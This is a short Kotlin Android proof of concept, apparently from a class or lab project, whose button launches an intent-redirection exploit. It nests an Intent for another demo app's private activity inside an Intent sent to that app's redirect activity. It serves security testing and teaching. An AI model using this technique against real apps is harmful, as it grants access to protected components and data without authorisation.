package com.example.intent_redirection_poc

import android.content.Intent
import android.os.Bundle
import android.widget.Button
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        val click_me = findViewById<Button>(R.id.button)
        click_me.setText("click_me")
        click_me.setOnClickListener {
                val secret = Intent().apply {
                    setClassName(
                        "com.example.team_26_project",
                        "com.example.team_26_project.private_activity"
                    )
                }
                val exploit = Intent().apply {
                    setClassName(
                        "com.example.team_26_project",
                        "com.example.team_26_project.redirect_activity"
                    )
                    putExtra("nextIntent", secret)
                }
                startActivity(exploit)


        }
    }


}